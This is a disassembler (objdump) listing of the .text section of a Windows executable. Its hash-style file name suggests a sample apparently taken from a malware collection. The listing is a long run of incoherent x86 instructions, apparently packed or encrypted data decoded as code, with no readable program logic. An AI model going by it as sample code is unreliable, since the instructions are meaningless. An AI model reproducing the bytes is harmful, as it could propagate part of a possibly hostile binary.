
187fbe2284131673d3ee7ab33974a73e0c365cca2ebc137acccc6fbb5f1032a1.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	adc    al,0xa3
  401002:	and    bl,ch
  401004:	and    BYTE PTR [eax+edx*1],ah
  401007:	add    eax,0x80422004
  40100c:	adc    al,0x87
  40100e:	adc    BYTE PTR [ecx],ah
  401010:	push   0x42820000
  401015:	pop    es
  401016:	add    BYTE PTR [eax],cl
  401018:	mov    bl,BYTE PTR [edx]
  40101a:	add    eax,0x904020
  40101f:	push   es
  401020:	add    cl,al
  401022:	add    ch,al
  401024:	inc    eax
  401025:	or     al,BYTE PTR [ecx]
  401027:	and    eax,0x10200511
  40102c:	adc    eax,0xe21200
  401031:	add    dl,BYTE PTR [ecx]
  401033:	inc    eax
  401034:	adc    BYTE PTR [eax],0xa
  401037:	add    BYTE PTR [ecx],al
  401039:	les    esi,FWORD PTR [ecx+0x0]
  40103c:	adc    cl,BYTE PTR [eax-0x7b2ceb78]
  401042:	ret    0x400
  401045:	or     BYTE PTR [ebx+edx*4-0x65d7f64e],al
  40104c:	or     BYTE PTR [edx],cl
  40104e:	add    BYTE PTR [eax+0x20],al
  401051:	adc    BYTE PTR [edx],0x0
  401054:	push   eax
  401055:	sbb    al,BYTE PTR [eax]
  401057:	test   BYTE PTR [eax],al
  401059:	add    DWORD PTR [eax],eax
  40105b:	dec    esp
  40105c:	sub    BYTE PTR [ecx],0x40
  40105f:	and    BYTE PTR [eax],cl
  401061:	or     DWORD PTR [ecx-0x4fffbb5e],esi
  401067:	add    BYTE PTR [eax],al
  401069:	and    DWORD PTR [eax+0x48110240],eax
  40106f:	xor    al,0xb
  401071:	add    al,0x0
  401073:	add    BYTE PTR [eax-0x7fdf1e70],al
  401079:	dec    esp
  40107a:	(bad)  
  40107b:	sbb    DWORD PTR [eax],eax
  40107d:	sub    BYTE PTR [eax],0x40
  401080:	cmp    DWORD PTR [ecx],edx
  401082:	sub    al,BYTE PTR [eax]
  401084:	sub    al,0x61
  401086:	and    al,0x0
  401088:	daa    
  401089:	dec    eax
  40108a:	and    edx,DWORD PTR [ebx]
  40108c:	inc    ecx
  40108d:	test   BYTE PTR [ecx],dl
  40108f:	dec    edx
  401090:	hlt    
  401091:	inc    ebx
  401092:	xchg   esp,eax
  401093:	xchg   ecx,eax
  401094:	sbb    BYTE PTR [eax-0x48],ah
  401097:	adc    al,0xf1
  401099:	or     BYTE PTR ds:0x1481886c,dl
  40109f:	push   ecx
  4010a0:	jb     0x4010a3
  4010a2:	adc    BYTE PTR [eax+eax*1],0xa1
  4010a6:	add    BYTE PTR [edi+0xac400c0],cl
  4010ac:	add    BYTE PTR [ecx+0x18],dl
  4010af:	add    dl,BYTE PTR [ecx]
  4010b1:	or     BYTE PTR [eax-0x7ffd27f8],bh
  4010b7:	push   ebp
  4010b8:	add    BYTE PTR [edx],ah
  4010ba:	enter  0xa20,0x22
  4010be:	cmp    al,0x8
  4010c0:	les    ebp,FWORD PTR [eax]
  4010c2:	add    al,0x68
  4010c4:	dec    eax
  4010c5:	add    BYTE PTR [edx],al
  4010c7:	add    BYTE PTR [eax+0x2875069],cl
  4010cd:	add    BYTE PTR [ecx],dl
  4010cf:	or     BYTE PTR [ecx],0x86
  4010d2:	and    dl,BYTE PTR [ecx]
  4010d4:	add    BYTE PTR [ecx+eax*4],ch
  4010d7:	inc    esp
  4010d8:	dec    eax
  4010d9:	add    dh,BYTE PTR [eax+0x61]
  4010dc:	mov    BYTE PTR [edx],al
  4010de:	push   eax
  4010df:	call   0xe109:0x40804180
  4010e6:	add    eax,0x4330f45
  4010eb:	adc    al,0x42
  4010ee:	adc    BYTE PTR [eax+0x9c21402],cl
  4010f4:	sbb    BYTE PTR [ecx+0x21529318],al
  4010fa:	add    al,0x0
  4010fc:	add    BYTE PTR [eax+ecx*1],0x2
  401100:	pop    es
  401101:	adc    BYTE PTR [eax],cl
  401103:	mov    al,0xc
  401105:	push   eax
  401106:	add    al,0x80
  401108:	add    ebx,DWORD PTR [eax]
  40110a:	xor    dl,BYTE PTR [eax]
  40110c:	add    cl,BYTE PTR [eax]
  40110e:	add    BYTE PTR [ebx+0x4141020],al
  401114:	add    DWORD PTR [ecx+0x30],esp
  401117:	add    dl,ah
  401119:	inc    esp
  40111a:	adc    DWORD PTR [eax],ecx
  40111c:	or     eax,0x850e24c0
  401121:	add    al,0x10
  401123:	mov    al,ds:0x6004124
  401128:	sub    BYTE PTR [esi],bl
  40112a:	or     al,BYTE PTR [eax]
  40112c:	pusha  
  40112d:	inc    ecx
  40112e:	or     al,0x0
  401130:	inc    ebx
  401131:	add    al,0x8f
  401133:	js     0x401147
  401135:	adc    BYTE PTR gs:[eax],dl
  401138:	add    BYTE PTR [esi-0x77f5bfba],0x28
  40113f:	adc    DWORD PTR [eax],eax
  401141:	ret    0x2a2
  401144:	and    DWORD PTR [eax+0x1010d428],eax
  40114a:	nop
  40114b:	inc    ecx
  40114c:	adc    BYTE PTR [edx],cl
  40114e:	sub    DWORD PTR [eax],eax
  401150:	and    al,0x1
  401152:	add    ah,BYTE PTR [eax]
  401154:	add    BYTE PTR [eax],al
  401156:	add    al,BYTE PTR [eax]
  401158:	xchg   ecx,eax
  401159:	add    BYTE PTR [ebx],al
  40115b:	xchg   ebp,eax
  40115c:	adc    DWORD PTR [eax-0x7c],eax
  40115f:	and    dl,dl
  401161:	add    BYTE PTR [edx],ah
  401163:	out    dx,al
  401164:	add    BYTE PTR [edi+0x28],al
  401167:	add    al,0x4c
  401169:	cmovp  eax,DWORD PTR [eax]
  40116c:	xor    BYTE PTR [eax+eax*1],al
  40116f:	add    BYTE PTR [ebp+0x7],al
  401172:	imul   esp,DWORD PTR [eax],0xd8c27
  401178:	sub    DWORD PTR [eax],esp
  40117a:	bound  eax,QWORD PTR [eax]
  40117c:	add    DWORD PTR [edx],edx
  40117e:	mov    cl,0x80
  401180:	pusha  
  401181:	or     BYTE PTR [ebx-0x1c],ah
  401184:	or     BYTE PTR [ecx+ecx*1],dl
  401187:	add    DWORD PTR [ecx],esi
  401189:	adc    BYTE PTR [ecx+0x204202],0x6
  401190:	inc    eax
  401191:	dec    eax
  401192:	sbb    dl,ch
  401194:	and    dl,BYTE PTR [edx-0x5de6e000]
  40119a:	or     al,BYTE PTR [eax]
  40119c:	adc    BYTE PTR [eax-0x2ef8f7d0],bl
  4011a2:	dec    ebp
  4011a3:	add    al,0x9a
  4011a5:	dec    eax
  4011a6:	adc    BYTE PTR [eax],al
  4011a8:	inc    edx
  4011a9:	add    BYTE PTR [eax-0x7fe69cf8],ah
  4011af:	and    al,0xc
  4011b1:	and    BYTE PTR [eax+0x24],cl
  4011b4:	sub    DWORD PTR [ecx],ecx
  4011b6:	pop    eax
  4011b7:	sub    al,BYTE PTR [eax+eax*1]
  4011ba:	cwde   
  4011bb:	or     DWORD PTR [ecx],0x20800140
  4011c1:	pusha  
  4011c2:	xor    al,0x2
  4011c4:	add    DWORD PTR [edx],eax
  4011c6:	dec    eax
  4011c7:	add    bl,BYTE PTR [eax+0x62446542]
  4011cd:	add    BYTE PTR [eax+0x1a001c54],al
  4011d3:	adc    al,BYTE PTR [ebp+0x17562]
  4011d9:	add    BYTE PTR [ecx],cl
  4011db:	and    al,0x1
  4011dd:	mov    ah,BYTE PTR [ecx]
  4011df:	adc    DWORD PTR [eax-0x40],ebp
  4011e2:	add    BYTE PTR [ecx+0x16],cl
  4011e5:	mov    al,BYTE PTR [eax]
  4011e7:	add    al,0xa
  4011e9:	add    BYTE PTR [eax],al
  4011eb:	and    BYTE PTR [eax+0x44],0x62
  4011ef:	inc    edx
  4011f0:	sub    al,0x88
  4011f2:	add    BYTE PTR [ecx+0x3],ah
  4011f5:	add    dl,BYTE PTR [esp+edx*1+0x2]
  4011f9:	test   BYTE PTR [eax+ecx*1],al
  4011fc:	add    bh,BYTE PTR [eax]
  4011fe:	test   BYTE PTR [eax],al
  401200:	or     BYTE PTR [esp+edx*1+0x23417020],al
  401207:	pop    ss
  401208:	and    BYTE PTR [ecx+0xc],dh
  40120b:	mov    WORD PTR [ecx],fs
  40120d:	add    al,BYTE PTR [eax]
  40120f:	or     eax,DWORD PTR [eax]
  401211:	or     DWORD PTR [ecx+0x1ca0460],0x488880
  40121b:	or     BYTE PTR [eax],0x44
  40121e:	or     al,0x87
  401220:	inc    eax
  401221:	adc    BYTE PTR [eax+eax*2+0x41],al
  401225:	add    BYTE PTR [eax],0x41
  401228:	and    eax,ecx
  40122a:	or     ah,BYTE PTR [ebx+eax*4+0x201440e]
  401231:	pusha  
  401232:	and    BYTE PTR [ecx+0x45],al
  401235:	sub    al,BYTE PTR [eax]
  401237:	adc    BYTE PTR [eax],dl
  401239:	cwde   
  40123a:	xchg   esi,eax
  40123b:	or     BYTE PTR [edx+edx*1+0x408202],cl
  401242:	add    eax,0x20263070
  401247:	inc    esp
  401248:	add    DWORD PTR [edi+0x4],0xffffff93
  40124c:	add    al,0x2c
  40124e:	mov    bh,0x84
  401250:	xor    al,0x83
  401253:	add    BYTE PTR [eax+0x18212440],al
  401259:	pusha  
  40125a:	and    DWORD PTR [edx+0x20c96b01],esi
  401260:	or     DWORD PTR [eax-0x7d],eax
  401263:	and    BYTE PTR [ecx],cl
  401265:	or     al,0x28
  401267:	and    al,BYTE PTR [eax-0x58]
  40126a:	sbb    dl,BYTE PTR [eax+0x20]
  40126d:	add    eax,0x29028
  401272:	pop    ecx
  401273:	add    ch,BYTE PTR [eax]
  401275:	adc    DWORD PTR [edx-0x72],eax
  401278:	sub    DWORD PTR [eax+eax*4],eax
  40127b:	add    BYTE PTR [eax+0x50],dl
  40127e:	adc    dl,BYTE PTR [edx+0x20]
  401281:	add    edx,DWORD PTR [eax+0x29446d11]
  401287:	and    eax,0x34149121
  40128c:	add    BYTE PTR [esp+eax*1],0x90
  401290:	or     ah,BYTE PTR [eax]
  401292:	and    BYTE PTR [eax+0x4f00040],0x0
  401299:	adc    DWORD PTR [eax+0x2e],0x8006296a
  4012a0:	push   0x1
  4012a2:	add    cl,BYTE PTR [esi]
  4012a4:	test   DWORD PTR [eax],esp
  4012a6:	or     al,0x2
  4012a8:	push   esp
  4012a9:	sub    BYTE PTR [esi],dl
  4012ab:	adc    BYTE PTR [esi+eax*1],ah
  4012ae:	adc    al,BYTE PTR [eax]
  4012b0:	adc    al,0x5c
  4012b2:	xor    al,BYTE PTR [eax]
  4012b4:	push   eax
  4012b5:	xchg   edx,eax
  4012b6:	sbb    BYTE PTR [eax+edx*1+0x9],al
  4012ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012bb:	pushf  
  4012bc:	adc    BYTE PTR [ebp+0x20b03020],al
  4012c2:	inc    ecx
  4012c3:	push   es
  4012c4:	jl     0x401308
  4012c6:	shl    BYTE PTR [edx],1
  4012c8:	adc    al,BYTE PTR [esi]
  4012ca:	add    al,0x0
  4012cc:	dec    ebx
  4012cd:	inc    edx
  4012ce:	xor    dh,BYTE PTR [eax]
  4012d0:	adc    BYTE PTR [eax+0x1],ch
  4012d3:	nop
  4012d4:	add    al,dh
  4012d6:	add    BYTE PTR [eax+0x20],al
  4012d9:	sbb    BYTE PTR [eax],al
  4012db:	inc    eax
  4012dc:	adc    BYTE PTR [ecx],al
  4012de:	enter  0xf003,0x6
  4012e2:	bound  edx,QWORD PTR es:[eax]
  4012e5:	and    ecx,DWORD PTR [eax+0x1028fb54]
  4012eb:	or     BYTE PTR [esi+eax*1+0x2],ch
  4012ef:	or     DWORD PTR [edi+0x8],eax
  4012f2:	mov    ds:0xa3101a70,al
  4012f7:	adc    BYTE PTR [edx],dl
  4012f9:	adc    BYTE PTR [eax],cl
  4012fb:	adc    cl,BYTE PTR [esp+edx*1+0x11040100]
  401302:	add    BYTE PTR [eax],al
  401304:	mov    ax,ds:0xc6c00a5c
  40130a:	add    al,al
  40130c:	and    BYTE PTR [edx-0x62],cl
  40130f:	loopne 0x4012ba
  401311:	add    al,0x17
  401313:	inc    eax
  401314:	and    BYTE PTR [eax],al
  401316:	push   cs
  401317:	xor    BYTE PTR [esi],al
  401319:	adc    DWORD PTR [eax+0x40496688],ecx
  40131f:	or     edx,DWORD PTR [eax]
  401321:	add    DWORD PTR [edx+edx*1],ebp
  401324:	add    BYTE PTR [edx],dl
  401326:	cmp    al,0x51
  401328:	and    BYTE PTR [eax],dl
  40132a:	or     BYTE PTR [esi+0x44901680],dh
  401330:	cli    
  401331:	push   ss
  401332:	bound  eax,QWORD PTR [edx+eax*4]
  401335:	or     al,0xe0
  401337:	and    al,0x20
  401339:	xchg   esp,eax
  40133a:	and    al,ah
  40133c:	pushf  
  40133d:	add    BYTE PTR [eax+0x61134],ah
  401343:	add    DWORD PTR [ecx+edx*1],edx
  401346:	shr    BYTE PTR [ebx+0xe],1
  401349:	inc    ebx
  40134a:	and    BYTE PTR [eax+esi*4],dl
  40134d:	inc    eax
  40134e:	pusha  
  40134f:	leave  
  401350:	and    eax,0x66401c00
  401355:	add    BYTE PTR [eax],0x3
  401358:	add    dl,BYTE PTR [edi]
  40135a:	add    DWORD PTR [eax+0x11b80281],esi
  401360:	add    BYTE PTR [eax+ecx*4+0x10280184],cl
  401367:	add    dl,BYTE PTR [eax+eax*1]
  40136a:	or     eax,0xc5c02a
  40136f:	rol    BYTE PTR [esi],cl
  401371:	inc    esp
  401372:	and    al,BYTE PTR [eax+0x20]
  401375:	sbb    BYTE PTR [ebx+0x385c168],al
  40137b:	add    DWORD PTR [esi+0x52],edx
  40137e:	xchg   edi,eax
  40137f:	add    al,0x2
  401381:	add    ah,BYTE PTR [ebx]
  401383:	inc    eax
  401384:	or     ah,dl
  401386:	add    al,BYTE PTR ds:0x51403090
  40138c:	add    BYTE PTR [edx+ecx*2],al
  40138f:	or     BYTE PTR [esi-0x70],al
  401392:	and    BYTE PTR [edx],dl
  401394:	mov    edx,es
  401396:	mov    eax,0x80480251
  40139b:	or     BYTE PTR [edx],ah
  40139d:	lods   al,BYTE PTR ds:[esi]
  40139e:	add    al,0x20
  4013a0:	add    BYTE PTR [edx],ch
  4013a2:	add    eax,eax
  4013a4:	adc    DWORD PTR [ecx-0x77fe3fa9],edx
  4013aa:	inc    edx
  4013ab:	nop
  4013ac:	dec    eax
  4013ad:	or     BYTE PTR [edx+edx*1],al
  4013b0:	pusha  
  4013b1:	add    BYTE PTR [ecx+0xe],0x0
  4013b5:	and    BYTE PTR [eax+0x28],bl
  4013b8:	adc    BYTE PTR [eax-0x5c],0x40
  4013bc:	dec    eax
  4013bd:	push   es
  4013be:	and    BYTE PTR [eax-0x6bbff577],cl
  4013c4:	mov    BYTE PTR [esi],dh
  4013c6:	add    BYTE PTR [ebx],al
  4013c8:	adc    BYTE PTR [ebp+0x8],al
  4013cb:	or     BYTE PTR [ecx+0x14],al
  4013ce:	push   edx
  4013cf:	and    BYTE PTR [eax],0x4
  4013d2:	and    DWORD PTR [ebp+ecx*1+0x6c18c],eax
  4013d9:	dec    eax
  4013da:	add    al,0x8
  4013dc:	add    BYTE PTR [edx],ah
  4013de:	push   eax
  4013df:	leave  
  4013e0:	add    BYTE PTR [eax],al
  4013e2:	call   0x6262:0x2029a280
  4013e9:	and    al,0x8
  4013eb:	dec    ecx
  4013ec:	xor    al,0x42
  4013ee:	push   ebp
  4013ef:	dec    edx
  4013f0:	add    BYTE PTR [ebx+0x4420250],ah
  4013f6:	add    BYTE PTR [esi],bh
  4013f8:	sbb    BYTE PTR [eax-0x7f],ah
  4013fb:	add    DWORD PTR [ebx],eax
  4013fd:	sbb    BYTE PTR [eax-0x74],0x42
  401401:	js     0x401423
  401403:	inc    ecx
  401404:	or     BYTE PTR [edx+0x38],dl
  401407:	mov    al,0x80
  401409:	xchg   BYTE PTR [eax],al
  40140b:	call   0x42359a
  401410:	add    al,al
  401412:	add    edx,ecx
  401414:	add    BYTE PTR [eax],al
  401416:	ror    DWORD PTR [eax],0x0
  401419:	add    BYTE PTR [ecx],al
  40141b:	add    BYTE PTR [ecx-0x7aff37b6],al
  401421:	or     BYTE PTR [edx],0x1
  401424:	nop
  401425:	add    BYTE PTR [eax+0xa],ah
  401428:	sbb    BYTE PTR [ecx],cl
  40142a:	inc    edi
  40142b:	xor    BYTE PTR [eax],0x0
  40142e:	and    BYTE PTR [edx+0xb0830c0],ah
  401434:	inc    ebx
  401435:	cmp    eax,0x20035002
  40143a:	add    BYTE PTR [eax-0x68],al
  40143d:	add    al,0xa
  40143f:	inc    eax
  401440:	call   0x2102:0x25800888
  401447:	inc    ebp
  401448:	xor    BYTE PTR [ecx],al
  40144a:	and    al,0x10
  40144c:	dec    esp
  40144d:	inc    ecx
  40144e:	add    al,0x10
  401450:	retf   0x1024
  401453:	enter  0x4010,0x81
  401457:	add    al,0x8
  401459:	popa   
  40145a:	add    eax,0x94301
  40145f:	add    BYTE PTR [eax],dl
  401461:	popf   
  401462:	and    BYTE PTR [ecx+0x2],0x51
  401466:	add    al,BYTE PTR [edx+0x12d8000]
  40146c:	adc    BYTE PTR [ecx+ecx*1],cl
  40146f:	adc    BYTE PTR [eax+0x434010d0],0x0
  401476:	xor    al,BYTE PTR [eax+eax*2+0x48009000]
  40147d:	and    al,0x8
  40147f:	xor    eax,esp
  401481:	adc    BYTE PTR [eax],al
  401483:	add    dl,BYTE PTR [eax+0x13]
  401486:	add    BYTE PTR [edx+0x0],ah
  401489:	add    BYTE PTR [edx],bh
  40148b:	inc    eax
  40148c:	inc    edx
  40148d:	add    DWORD PTR [edx],eax
  40148f:	add    eax,0x70894048
  401494:	and    BYTE PTR [ecx+eax*1+0x12ba1488],ah
  40149b:	add    al,0x0
  40149d:	adc    BYTE PTR [ecx],dl
  40149f:	add    BYTE PTR [eax],0xc0
  4014a2:	or     BYTE PTR [eax+0x1],ch
  4014a5:	pop    esp
  4014a6:	aad    0x0
  4014a8:	inc    ebx
  4014a9:	mov    al,0x28
  4014ab:	add    BYTE PTR [esi],cl
  4014ad:	and    DWORD PTR [eax+edx*1],0x1
  4014b1:	sub    DWORD PTR [eax-0x77b7bfe8],esi
  4014b7:	add    al,0x11
  4014b9:	adc    BYTE PTR [ecx],al
  4014bb:	adc    BYTE PTR [ecx-0x7be6c400],al
  4014c1:	or     al,0x0
  4014c3:	inc    eax
  4014c4:	je     0x4014ce
  4014c6:	add    BYTE PTR [edx+0x44],ch
  4014c9:	add    al,0x10
  4014cb:	add    al,0x28
  4014cd:	or     esi,DWORD PTR [ebx]
  4014cf:	loopne 0x4014d1
  4014d1:	add    al,0x8c
  4014d3:	add    dl,BYTE PTR [ebp+0x23]
  4014d6:	ror    BYTE PTR [edx],0x0
  4014d9:	add    esp,DWORD PTR [edx]
  4014db:	sub    BYTE PTR [eax+eax*1],al
  4014de:	or     DWORD PTR [eax-0x5e],eax
  4014e1:	adc    BYTE PTR [edx+eiz*4],0x60
  4014e5:	adc    BYTE PTR [ecx],al
  4014e7:	cwde   
  4014e8:	add    ecx,eax
  4014ea:	test   BYTE PTR [ecx+eiz*4],cl
  4014ed:	add    BYTE PTR [eax],0x62
  4014f0:	or     BYTE PTR [edx],al
  4014f2:	add    BYTE PTR [eax+eax*1],bl
  4014f5:	adc    BYTE PTR ds:0x40910040,0x8
  4014fc:	and    BYTE PTR [edx+0xe],al
  4014ff:	and    DWORD PTR [edx+edx*8],eax
  401502:	adc    BYTE PTR [ecx],cl
  401504:	add    DWORD PTR [edx],eax
  401506:	inc    eax
  401507:	or     BYTE PTR [ecx],ah
  401509:	mov    al,0x32
  40150b:	add    al,al
  40150d:	add    al,0x56
  40150f:	adc    al,0x94
  401511:	or     al,0x82
  401513:	and    al,0x11
  401515:	push   es
  401516:	add    eax,0x8030000a
  40151b:	add    bh,BYTE PTR [edx]
  40151d:	mov    BYTE PTR [eax+0x1804108c],al
  401523:	push   eax
  401524:	mov    eax,0x4818001
  401529:	cmp    BYTE PTR [eax],ah
  40152b:	and    BYTE PTR [esi],ch
  40152d:	and    al,BYTE PTR [eax+0x14]
  401530:	inc    eax
  401531:	or     ah,BYTE PTR [ecx+eax*2]
  401534:	mov    DWORD PTR [edx],ecx
  401536:	add    BYTE PTR [eax],0x5
  401539:	add    DWORD PTR [edx],esp
  40153b:	or     BYTE PTR [ebx+0x21],ah
  40153e:	inc    eax
  40153f:	or     BYTE PTR [eax],cl
  401541:	add    ecx,esp
  401543:	or     BYTE PTR [edi],al
  401545:	add    ah,BYTE PTR [edx-0x3f5d7c00]
  40154b:	add    BYTE PTR [ebx],al
  40154d:	add    al,0x31
  40154f:	xor    al,BYTE PTR [eax]
  401551:	adc    BYTE PTR [ebx],ah
  401553:	add    BYTE PTR [eax],al
  401555:	ror    BYTE PTR [eax+eax*1],1
  401558:	inc    ecx
  401559:	or     BYTE PTR [edx+0x10],ah
  40155c:	adc    BYTE PTR [esi-0x5bfdf4fc],ah
  401562:	inc    eax
  401563:	adc    BYTE PTR [ecx-0x7e],al
  401566:	and    BYTE PTR [eax+0x5d],cl
  401569:	lock adc BYTE PTR [ecx-0x40],al
  40156d:	sbb    al,0xa2
  40156f:	add    BYTE PTR [edx+0x0],al
  401572:	and    BYTE PTR [edx],al
  401574:	adc    BYTE PTR [ecx+eiz*4],0xc
  401578:	mov    al,ds:0x82205a11
  40157d:	inc    eax
  40157e:	add    al,al
  401580:	or     BYTE PTR [eax+0x0],dl
  401583:	inc    ecx
  401584:	inc    eax
  401585:	push   es
  401586:	add    al,0x1
  401588:	xchg   esp,eax
  401589:	add    BYTE PTR [eax+0x8],al
  40158c:	mov    BYTE PTR [eax],ah
  40158e:	adc    BYTE PTR [eax],al
  401590:	add    BYTE PTR [ecx],0x8a
  401593:	xor    DWORD PTR [eax],edx
  401595:	sbb    BYTE PTR [eax],dh
  401597:	add    BYTE PTR [eax+eiz*1-0x7e],ah
  40159b:	add    al,0x22
  40159d:	and    BYTE PTR [edx],al
  40159f:	and    DWORD PTR [eax-0x7d4ffdfe],edi
  4015a5:	test   BYTE PTR [eax+0x18],al
  4015a8:	pusha  
  4015a9:	inc    edx
  4015aa:	pop    es
  4015ab:	mov    ds:0x60b0044,al
  4015b0:	cmp    al,0x84
  4015b2:	ds and al,0x0
  4015b5:	adc    eax,0xd001403a
  4015ba:	push   es
  4015bb:	inc    eax
  4015bc:	inc    ebp
  4015bd:	sub    eax,DWORD PTR [eax]
  4015bf:	bound  eax,QWORD PTR [eax-0x70]
  4015c2:	mov    eax,ds:0x4040830
  4015c7:	dec    eax
  4015c8:	push   eax
  4015c9:	addr16 test ecx,eax
  4015cc:	or     BYTE PTR [ebx+ecx*8],bl
  4015cf:	pop    es
  4015d0:	adc    ecx,eax
  4015d2:	add    DWORD PTR [eax],edx
  4015d4:	add    al,0x82
  4015d6:	sbb    al,0x0
  4015d8:	and    BYTE PTR [ebx],ch
  4015da:	add    eax,edx
  4015dc:	and    BYTE PTR [eax+eiz*4+0x20200620],dl
  4015e3:	inc    edx
  4015e4:	push   cs
  4015e5:	and    BYTE PTR [ecx+0x19944820],al
  4015eb:	mov    BYTE PTR ds:0xc0040a0,al
  4015f1:	add    DWORD PTR [ecx],edx
  4015f3:	add    BYTE PTR [eax],0x52
  4015f6:	rol    BYTE PTR [ecx-0x7fcc67ee],0x48
  4015fd:	sbb    DWORD PTR [eax+0x68],edx
  401600:	mov    al,ds:0xa2100
  401605:	add    BYTE PTR [ecx],bl
  401607:	inc    eax
  401608:	add    BYTE PTR [eax+0x8],ch
  40160b:	sub    BYTE PTR [ecx-0x7df6f7f8],al
  401611:	ror    DWORD PTR [ecx+0x48],1
  401614:	add    DWORD PTR [eax],eax
  401616:	xchg   ebx,eax
  401617:	add    BYTE PTR [esi+eax*1],cl
  40161a:	adc    DWORD PTR [ebx-0x77],edx
  40161d:	adc    BYTE PTR [eax],al
  40161f:	inc    esp
  401620:	mov    eax,ds:0x48d09e70
  401625:	add    al,0x10
  401627:	add    BYTE PTR [eax],al
  401629:	adc    BYTE PTR [eax-0x6f],cl
  40162c:	and    BYTE PTR [edx],al
  40162e:	nop
  40162f:	add    BYTE PTR [ecx],al
  401631:	xor    BYTE PTR [eax],0x0
  401634:	mov    ah,0x4
  401636:	(bad)  
  401637:	nop
  401638:	or     DWORD PTR [edx],ecx
  40163a:	and    BYTE PTR [eax-0x7ffab7d4],0x1e
  401641:	inc    eax
  401642:	and    al,0x4
  401644:	test   BYTE PTR [eax+0x10701280],al
  40164a:	add    al,0x48
  40164c:	mov    al,0x11
  40164e:	or     dl,BYTE PTR [eax]
  401650:	add    ah,BYTE PTR [esi]
  401652:	add    BYTE PTR [edx],ah
  401654:	push   es
  401655:	test   eax,eax
  401657:	xchg   esp,eax
  401658:	pusha  
  401659:	sbb    edx,DWORD PTR [eax]
  40165b:	add    BYTE PTR [eax+eiz*1],bh
  40165e:	inc    edx
  40165f:	shl    BYTE PTR [ecx],0x6
  401662:	call   0x80:0x5091407c
  401669:	dec    eax
  40166a:	test   DWORD PTR [eax-0x19f6fee0],edx
  401670:	inc    eax
  401671:	xor    DWORD PTR [edx],eax
  401673:	ret    0x404a
  401676:	xor    al,0x56
  401678:	add    al,BYTE PTR [ebp+0x21084400]
  40167e:	jo     0x401680
  401680:	inc    edx
  401681:	or     eax,0xc28c
  401686:	add    BYTE PTR [ecx],dl
  401688:	add    al,al
  40168a:	or     BYTE PTR [ecx-0x7f],0x22
  40168e:	sbb    DWORD PTR [ecx],ebx
  401690:	nop
  401691:	pop    eax
  401692:	jb     0x401694
  401694:	shl    DWORD PTR [edx+eax*2],0x0
  401698:	add    esp,DWORD PTR [eax]
  40169a:	push   eax
  40169b:	test   al,0x84
  40169d:	inc    eax
  40169e:	or     al,BYTE PTR [eax+0x8]
  4016a1:	pusha  
  4016a2:	and    BYTE PTR [eax+0x0],al
  4016a5:	add    ch,BYTE PTR [ecx]
  4016a7:	adc    bl,BYTE PTR [eax]
  4016a9:	and    BYTE PTR [esi+0x7a],cl
  4016ac:	call   0x1d266b5
  4016b1:	cwde   
  4016b2:	adc    al,0x5
  4016b4:	in     al,0x40
  4016b6:	and    eax,0x9d001
  4016bb:	adc    DWORD PTR [ecx+ecx*2],edx
  4016be:	push   0x20
  4016c0:	add    DWORD PTR [esi+ecx*1],eax
  4016c3:	sub    cl,BYTE PTR [eax-0x5e]
  4016c6:	push   edx
  4016c7:	mov    al,ds:0x6048821
  4016cc:	pop    ecx
  4016cd:	add    BYTE PTR [eax],0x6
  4016d0:	push   esp
  4016d1:	push   ebp
  4016d2:	bound  edi,QWORD PTR [eax]
  4016d4:	add    cl,BYTE PTR [eax-0x3b]
  4016d7:	adc    BYTE PTR [eax],al
  4016d9:	bound  ecx,QWORD PTR [esi+0xcc50e08]
  4016df:	or     BYTE PTR [eax],cl
  4016e1:	mov    BYTE PTR [edx+0x62147020],al
  4016e7:	push   esp
  4016e8:	add    al,0x2
  4016ea:	pusha  
  4016eb:	add    BYTE PTR [eax-0x7d77feef],ah
  4016f1:	shl    BYTE PTR [eax],0x40
  4016f4:	and    DWORD PTR ds:0x8c492080,0x8782012
  4016fe:	or     BYTE PTR [edx],ah
  401700:	or     BYTE PTR [edx+0x0],al
  401703:	inc    edx
  401704:	test   BYTE PTR [eax],dh
  401706:	push   esp
  401707:	or     DWORD PTR [ebx],eax
  401709:	dec    eax
  40170a:	add    dl,BYTE PTR [eax+0x28]
  40170d:	or     DWORD PTR [eax],ebp
  40170f:	add    BYTE PTR [eax+esi*8],ch
  401712:	and    BYTE PTR [edx],cl
  401714:	mov    al,0x0
  401716:	xchg   ecx,eax
  401717:	or     BYTE PTR [eax],ah
  401719:	add    DWORD PTR [eax],eax
  40171b:	add    ebp,DWORD PTR [eax-0x5ef5dfb8]
  401721:	add    al,BYTE PTR [eax+0x6405220a]
  401727:	adc    DWORD PTR [eax],ecx
  401729:	and    DWORD PTR es:[ecx],eax
  40172c:	sub    DWORD PTR [eax+0x2230008d],esp
  401732:	enter  0x9873,0x4
  401736:	inc    eax
  401737:	push   ds
  401738:	jmp    0xd3c8:0x2080658
  40173f:	pop    edx
  401740:	add    BYTE PTR [eax+ecx*1],ah
  401743:	add    al,BYTE PTR [edx]
  401745:	pop    esp
  401746:	xor    BYTE PTR [eax],al
  401748:	adc    BYTE PTR [ebx+0x3],ah
  40174b:	inc    ecx
  40174c:	or     BYTE PTR [ecx],al
  40174e:	add    BYTE PTR [ecx+eax*1],bl
  401751:	adc    DWORD PTR [ecx+0x4f4a7941],0x4
  401758:	add    dl,BYTE PTR [eax-0x6f0d9000]
  40175e:	xor    BYTE PTR [eax+0x5],bl
  401761:	add    BYTE PTR [esi],ah
  401763:	inc    edx
  401764:	push   eax
  401765:	inc    eax
  401766:	sub    BYTE PTR [ecx],0xd
  401769:	and    al,0x0
  40176b:	adc    BYTE PTR [eax],ah
  40176d:	or     al,bl
  40176f:	and    BYTE PTR [ebx],cl
  401771:	inc    eax
  401772:	add    BYTE PTR [eax+ecx*1+0x14],cl
  401776:	add    al,0x0
  401778:	adc    BYTE PTR [ecx],al
  40177a:	rcl    DWORD PTR [ebp-0x77fbffc0],0x8
  401781:	or     BYTE PTR [eax],al
  401783:	and    BYTE PTR [ecx],dl
  401785:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401786:	add    BYTE PTR [eax],al
  401788:	mov    ecx,DWORD PTR [eax]
  40178a:	test   al,0x61
  40178c:	pop    edx
  40178d:	xchg   BYTE PTR [eax-0x60],al
  401790:	adc    BYTE PTR [ecx+0x29],ah
  401793:	xor    BYTE PTR [edx+0x62],ah
  401796:	and    al,0x10
  401798:	add    BYTE PTR [eax],al
  40179a:	rol    BYTE PTR [eax+0x87780],0x4
  4017a1:	push   ebp
